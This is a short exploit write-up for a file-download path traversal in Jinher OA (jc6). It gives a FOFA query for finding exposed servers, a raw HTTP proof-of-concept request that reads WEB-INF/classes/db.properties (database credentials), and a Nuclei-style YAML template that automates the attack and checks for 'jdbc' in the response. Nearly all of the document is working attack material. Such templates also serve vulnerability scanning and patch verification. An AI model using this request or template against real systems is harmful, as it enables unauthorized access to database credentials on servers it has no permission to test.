# fofa

```plain
app="Jinher-OA" && body="/jc6/"
```

# POC

```http
GET /jc6/JHSoft.WCF/login/oaplusrangedownloadfile?filename=../WEB-INF/classes/db.properties HTTP/1.1
Host: 
accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

# yaml

```yaml
id: jinher-jc6-oaplusrangedownloadfile-filedownload

info:
    name: jinher jc6 oaplusrangedownloadfile filedownload
    author: zxf
    severity: high
    metadata: 
      fofasearch: app="Jinher-OA" && body="/jc6/"

http:
  - raw:
    - |
      GET /jc6/JHSoft.WCF/login/oaplusrangedownloadfile?filename=../WEB-INF/classes/db.properties HTTP/1.1
      Host: {{Hostname}}
      accept: */*
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
      Accept-Encoding: gzip, deflate, br
      Accept-Language: zh-CN,zh;q=0.9
      Connection: close
      
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"jc6.config" && contains_all(body,"jdbc"))  #status_code 状态码   # contains_all DSL中用于检查某个字符串（通常是 HTTP 响应体 body）中是否同时包含多个指定的子字符串
```

